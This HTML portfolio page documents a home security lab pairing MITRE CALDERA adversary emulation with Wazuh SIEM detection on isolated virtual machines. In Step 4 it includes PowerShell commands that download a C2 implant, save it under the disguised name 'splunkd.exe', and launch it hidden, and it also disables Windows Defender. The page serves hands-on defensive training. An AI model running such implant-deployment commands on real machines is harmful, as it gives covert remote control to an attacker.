<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Red Team vs Blue Team Lab | Cristian Tapia</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            color: #333;
            background: #fff;
        }
        
        header {
            background: #2c3e50;
            color: #fff;
            padding: 2rem;
            text-align: center;
        }
        
        header h1 {
            font-size: 2.2rem;
            margin-bottom: 0.5rem;
        }
        
        header p {
            font-size: 1.1rem;
        }
        
        .container {
            max-width: 900px;
            margin: 0 auto;
            padding: 2rem;
        }
        
        section {
            margin-bottom: 3rem;
        }
        
        h2 {
            color: #2c3e50;
            border-bottom: 2px solid #3498db;
            padding-bottom: 0.5rem;
            margin-bottom: 1.5rem;
        }
        
        h3 {
            color: #34495e;
            margin-top: 1.5rem;
            margin-bottom: 1rem;
        }
        
        .step {
            background: #f8f9fa;
            padding: 1.5rem;
            margin: 1.5rem 0;
            border-left: 4px solid #3498db;
        }
        
        img {
            max-width: 100%;
            height: auto;
            margin: 1rem 0;
            border: 1px solid #ddd;
        }
        
        code {
            background: #f4f4f4;
            padding: 2px 6px;
            border-radius: 3px;
            font-family: monospace;
        }
        
        pre {
            background: #2c3e50;
            color: #fff;
            padding: 1rem;
            overflow-x: auto;
            margin: 1rem 0;
            border-radius: 4px;
        }
        
        pre code {
            background: none;
            color: #fff;
            padding: 0;
        }
        
        ul {
            margin-left: 2rem;
            margin-top: 0.5rem;
        }
        
        li {
            margin-bottom: 0.5rem;
        }
        
        .info-box {
            background: #e8f4f8;
            border-left: 4px solid #3498db;
            padding: 1rem;
            margin: 1rem 0;
        }
        
        footer {
            background: #2c3e50;
            color: #fff;
            text-align: center;
            padding: 1.5rem;
            margin-top: 3rem;
        }
        
        footer a {
            color: #3498db;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <header>
        <h1>sirtapia's Red Team vs Blue Team Security Lab</h1>
        <p>MITRE CALDERA & Wazuh SIEM</p>
    </header>

    <div class="container">
        <section>
            <h2>Description</h2>
            <p>This project demonstrates real-world attack and defense scenarios by simulating red team operations using MITRE CALDERA and monitoring detection capabilities with Wazuh SIEM. The lab environment consists of three virtual machines on an isolated network, allowing for safe adversary emulation and threat detection analysis.</p>
        </section>

        <section>
            <h2>Skills Demonstrated</h2>
            <ul>
                <li>Red Team Operations – Executed adversary emulation using MITRE CALDERA C2 framework</li>
                <li>SIEM Configuration – Deployed and configured Wazuh for security event monitoring</li>
                <li>Threat Detection & Analysis – Analyzed attack patterns and correlated alerts with MITRE ATT&CK techniques</li>
                <li>Agent Deployment – Installed and managed Wazuh agents and CALDERA Sandcat implants</li>
                <li>Security Operations – Performed threat hunting, event correlation, and gap analysis</li>
                <li>Network Segmentation – Configured isolated VMnet1 environment for controlled testing</li>
                <li>Adversary Tactics – Simulated credential access, privilege escalation, lateral movement, and persistence</li>
                <li>Documentation & Reporting – Created comprehensive attack-to-detection analysis</li>
            </ul>

            <h3>Languages and Utilities Used</h3>
            <p>Python | PowerShell | Bash | MITRE CALDERA | Wazuh SIEM | OpenSearch Dashboards</p>

            <h3>Environments Used</h3>
            <p>Ubuntu Server 24.04 | Windows 10 | VMware Workstation Pro</p>
        </section>

        <section>
            <h2>Prerequisites</h2>
            
            <h3>Virtualization Software</h3>
            <ul>
                <li>VMware Workstation Pro or Player (free for personal use)</li>
                <li>Download: <a href="https://www.vmware.com/products/workstation-pro/workstation-pro-evaluation.html">VMware Website</a></li>
            </ul>

            <h3>Operating System ISOs</h3>
            <ul>
                <li>Ubuntu Server 24.04 LTS - <a href="https://ubuntu.com/download/server">Download</a> (~2.5 GB)</li>
                <li>Windows 10 ISO - <a href="https://www.microsoft.com/en-us/software-download/windows10">Download</a> (~5-6 GB)</li>
            </ul>

            <h3>System Requirements</h3>
            <ul>
                <li>16GB RAM (recommended)</li>
                <li>120GB free disk space</li>
                <li>CPU with virtualization support (Intel VT-x or AMD-V)</li>
            </ul>
        </section>

        <section>
            <h2>Lab Architecture</h2>
            <div class="info-box">
                <strong>Network Configuration:</strong><br>
                Wazuh Manager: 192.168.232.10<br>
                CALDERA Server: 192.168.232.33<br>
                Windows 10 Target: 192.168.232.20<br>
                Network: VMnet1 (Host-Only)
            </div>
        </section>

        <section>
            <h2>Step 1: Wazuh SIEM Installation</h2>
            
            <div class="step">
                <h3>Create Project Folder (Optional)</h3>
                <img src="https://i.imgur.com/vIxzDUG.png" alt="Create SIEM Project folder">
            </div>

            <div class="step">
                <h3>Create Ubuntu Server VM</h3>
                <p>Create VM with <strong>4GB RAM, 2 CPUs, 40GB disk</strong></p>
                <img src="https://i.imgur.com/syIQ6lU.png" alt="VM Configuration">
            </div>

            <div class="step">
                <h3>Install Ubuntu Server</h3>
                <p>During installation, <strong>uncheck "Set up disk as LVM"</strong></p>
                <img src="https://i.imgur.com/PpOcAfI.png" alt="Disk setup">
                <p>Hit continue:</p>
                <img src="https://i.imgur.com/YVF5akM.png" alt="Continue installation">
            </div>

            <div class="step">
                <h3>Set Username and Enable SSH</h3>
                <p>Username: <code>wazuh</code></p>
                <p>Check "Install OpenSSH"</p>
                <img src="https://i.imgur.com/pjnLN5g.png" alt="User configuration">
            </div>

            <div class="step">
                <h3>SSH into VM and Install Wazuh</h3>
                <p>Get VM's IP and SSH into it:</p>
                <img src="https://i.imgur.com/6WL2HVP.png" alt="SSH connection">
                <pre><code>ssh wazuh@[VM_IP]

sudo apt update && sudo apt upgrade -y
curl -sO https://packages.wazuh.com/4.9/wazuh-install.sh
sudo bash ./wazuh-install.sh -a</code></pre>
                <p>Wait 5-10 minutes for installation:</p>
                <img src="https://i.imgur.com/1taUEGK.png" alt="Installation commands">
            </div>

            <div class="step">
                <h3>Shutdown VM</h3>
                <img src="https://i.imgur.com/Iy4M3zT.png" alt="Shutdown VM">
            </div>

            <div class="step">
                <h3>Configure Network on VMnet1</h3>
                <p>In VMware: VM Settings → Network Adapter → Custom: VMnet1</p>
                <img src="https://i.imgur.com/EpoRKhS.png" alt="VMnet1 configuration">
            </div>

            <div class="step">
                <h3>Set Static IP</h3>
                <p>Power on VM and configure:</p>
                <pre><code>sudo nano /etc/netplan/50-cloud-init.yaml</code></pre>
                <img src="https://i.imgur.com/HnLDlE9.png" alt="Netplan edit">
                
                <p>Enter the following (use 4 spaces, NOT tabs):</p>
                <pre><code>network:
  version: 2
  ethernets:
    ens33:
      dhcp4: false
      addresses:
        - 192.168.232.10/24
      routes:
        - to: default
          via: 192.168.232.2
      nameservers:
        addresses:
          - 8.8.8.8
          - 8.8.4.4</code></pre>
                
                <img src="https://i.imgur.com/o9eAC3D.png" alt="Netplan configuration">
                
                <p>Save (Ctrl+O), Exit (Ctrl+X), then apply:</p>
                <pre><code>sudo netplan apply</code></pre>
            </div>

            <div class="step">
                <h3>Reset Password</h3>
                <p>Reset admin password before accessing dashboard:</p>
                <img src="https://i.imgur.com/aEbxHmG.png" alt="Reset password">
            </div>

            <div class="step">
                <h3>Access Wazuh Dashboard</h3>
                <p>Navigate to: <code>https://192.168.232.10</code></p>
                <img src="https://i.imgur.com/irU3pzZ.png" alt="Wazuh dashboard">
            </div>
        </section>

        <section>
            <h2>Step 2: CALDERA C2 Server Installation</h2>
            
            <div class="step">
                <h3>Create CALDERA VM</h3>
                <p>Create second Ubuntu Server VM with <strong>4GB RAM, 2 CPUs, 20GB disk</strong></p>
                <img src="https://i.imgur.com/Dw15yLp.png" alt="CALDERA VM creation">
                <p>Username: <code>caldera</code></p>
                <img src="https://i.imgur.com/nTMdva0.png" alt="CALDERA user setup">
            </div>

            <div class="step">
                <h3>Install Dependencies</h3>
                <pre><code>sudo apt update && sudo apt upgrade -y
sudo apt install -y python3 python3-pip git

curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
sudo apt install -y nodejs

wget https://go.dev/dl/go1.24.0.linux-amd64.tar.gz
sudo tar -C /usr/local -xzf go1.24.0.linux-amd64.tar.gz
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
source ~/.bashrc</code></pre>
            </div>

            <div class="step">
                <h3>Clone CALDERA and Install</h3>
                <pre><code>cd ~
git clone https://github.com/mitre/caldera.git --recursive
cd caldera
pip3 install -r requirements.txt --break-system-packages</code></pre>
            </div>

            <div class="step">
                <h3>Start CALDERA</h3>
                <p><strong>Note:</strong> Use <code>--build</code> flag only on first run</p>
                <pre><code>python3 server.py --insecure --build</code></pre>
                <img src="https://i.imgur.com/PmWYojp.png" alt="Starting CALDERA">
                <p>Wait for build to complete (10-15 minutes):</p>
                <img src="https://i.imgur.com/PCwIHKD.png" alt="CALDERA building">
            </div>

            <div class="step">
                <h3>Configure Network on VMnet1</h3>
                <p>Shutdown VM, switch to VMnet1:</p>
                <img src="https://i.imgur.com/5kh0lwl.png" alt="VMnet1 setup">
                <p>Configure static IP:</p>
                <pre><code>sudo nano /etc/netplan/50-cloud-init.yaml

network:
  version: 2
  ethernets:
    ens33:
      dhcp4: false
      addresses:
        - 192.168.232.33/24
      routes:
        - to: default
          via: 192.168.232.2
      nameservers:
        addresses:
          - 8.8.8.8
          - 8.8.4.4

sudo netplan apply</code></pre>
                <img src="https://i.imgur.com/BWAXWdQ.png" alt="CALDERA netplan">
            </div>

            <div class="step">
                <h3>Access CALDERA</h3>
                <p>Navigate to: <code>http://192.168.232.33:8888</code></p>
                <p>Username: <code>admin</code> | Password: <code>admin</code></p>
                <img src="https://i.imgur.com/Jw1MJnb.png" alt="CALDERA login">
            </div>
        </section>

        <section>
            <h2>Step 3: Windows 10 Target Configuration</h2>
            
            <div class="step">
                <h3>Create Windows 10 VM</h3>
                <p>Install Windows 10 Pro on VMnet1 network</p>
                <img src="https://i.imgur.com/YXnc5Ls.png" alt="Windows VM creation">
            </div>

            <div class="step">
                <h3>Configure Static IP</h3>
                <p>Set IP to <code>192.168.232.20</code></p>
                <p>Gateway: <code>192.168.232.2</code> | DNS: <code>8.8.8.8, 8.8.4.4</code></p>
                <img src="https://i.imgur.com/HbGFWEi.png" alt="Network settings 1">
                <img src="https://i.imgur.com/wgaM9RT.png" alt="Network settings 2">
            </div>

            <div class="step">
                <h3>Disable Windows Defender</h3>
                <p>Turn off Real-time protection for testing</p>
                <img src="https://i.imgur.com/7Rvbial.png" alt="Defender settings">
                <img src="https://i.imgur.com/FbzkAr8.png" alt="Defender disabled">
            </div>

            <div class="step">
                <h3>Install Wazuh Agent</h3>
                <p>Download and install Wazuh agent pointing to <code>192.168.232.10</code></p>
                <img src="https://i.imgur.com/7S789PS.png" alt="Agent installation">
            </div>

            <div class="step">
                <h3>Verify Connection</h3>
                <p>Check agent appears in Wazuh dashboard</p>
                <img src="https://i.imgur.com/pHaoaAz.png" alt="Agent connected">
            </div>
        </section>

        <section>
            <h2>Step 4: Deploy CALDERA Sandcat Agent</h2>
            
            <div class="step">
                <h3>Deploy Agent</h3>
                <p>In CALDERA: Agents → Deploy an agent → Select Sandcat for Windows</p>
                <img src="https://i.imgur.com/zmhCyvO.png" alt="Agent deployment">
            </div>

            <div class="step">
                <h3>Run PowerShell Commands</h3>
                <p>Open PowerShell as Administrator on Windows 10 and run:</p>
                <pre><code>Get-Process splunkd -ErrorAction SilentlyContinue | Stop-Process -Force

Remove-Item "C:\Users\Public\splunkd.exe" -Force -ErrorAction SilentlyContinue

Invoke-WebRequest -Uri "http://192.168.232.33:8888/file/download" -Headers @{"platform"="windows";"file"="sandcat.go"} -OutFile "C:\Users\Public\splunkd.exe"

Start-Process -FilePath "C:\Users\Public\splunkd.exe" -ArgumentList "-server http://192.168.232.33:8888 -group red" -WindowStyle hidden</code></pre>
                <img src="https://i.imgur.com/r81XNZL.png" alt="PowerShell execution">
            </div>

            <div class="step">
                <h3>Verify Agent Connection</h3>
                <p>Check CALDERA agents page - Windows agent should appear</p>
                <img src="https://i.imgur.com/FYvuM89.png" alt="Agent connected in CALDERA">
            </div>
        </section>

        <section>
            <h2>Step 5: Execute Adversary Operations</h2>
            
            <div class="step">
                <h3>Create Operation</h3>
                <p>Operations → New Operation → Select "Discovery" adversary → Group: red</p>
                <img src="https://i.imgur.com/YvjeK5Z.png" alt="Create operation">
            </div>

            <div class="step">
                <h3>Monitor Execution</h3>
                <p>Start operation and watch abilities execute</p>
                <img src="https://i.imgur.com/odTcH04.png" alt="Running operation">
            </div>

            <div class="step">
                <h3>View Results</h3>
                <p>Click on completed abilities to see outputs</p>
                <img src="https://i.imgur.com/2svcNkq.png" alt="Completed abilities">
            </div>
        </section>

        <section>
            <h2>Step 6: Detection Analysis in Wazuh</h2>
            
            <div class="step">
                <h3>Threat Hunting Dashboard</h3>
                <p>Navigate to Threat Hunting to view alerts</p>
                <img src="https://i.imgur.com/mRT1f89.png" alt="Threat Hunting dashboard">
            </div>

            <div class="step">
                <h3>Security Events</h3>
                <p>View events generated from attacks</p>
                <img src="https://i.imgur.com/2BgP6Oo.png" alt="Security events">
            </div>

            <div class="step">
                <h3>MITRE ATT&CK Mapping</h3>
                <p>View techniques detected and mapped to MITRE framework</p>
                <img src="https://i.imgur.com/w6z7xwQ.png" alt="MITRE mapping">
                <p>Click into specific alerts for detailed analysis</p>
            </div>
        </section>

        <section>
            <h2>Step 7: MITRE ATT&CK Coverage Analysis</h2>
            
            <div class="step">
                <h3>Access MITRE ATT&CK View</h3>
                <img src="https://i.imgur.com/S8DHo1I.png" alt="MITRE ATT&CK view">
            </div>

            <div class="step">
                <h3>Review Detected Techniques or Topics</h3>
                <img src="https://i.imgur.com/Z03Oqrw.png" alt="Detected techniques">
            </div>

            <div class="step">
                <h3>Identify Detection Gaps</h3>
                <img src="https://i.imgur.com/0RcscRd.png" alt="Detection gaps">
            </div>
        </section>

        <section>
            <h2>Conclusion</h2>
            <p>This project provided valuable hands on experience in both the offensive and defensive side of cybersecurity. Building this lab significantly enhanced my Linux administration skills, from configuring network interfaces with netplan to managing services and troubleshooting connectivity issues across multiple Ubuntu servers. The command-line proficiency I gained through SSH sessions, package management, and system configuration will be foundational for my career in cybersecurity.</p>
    </div>

    <footer>
        <p>&copy; 2025 Cristian Tapia | <a href="https://github.com/sirtapia">GitHub</a> | <a href="https://linkedin.com/in/cristian-tapia-076a84326">LinkedIn</a></p>
    </footer>
</body>
</html>
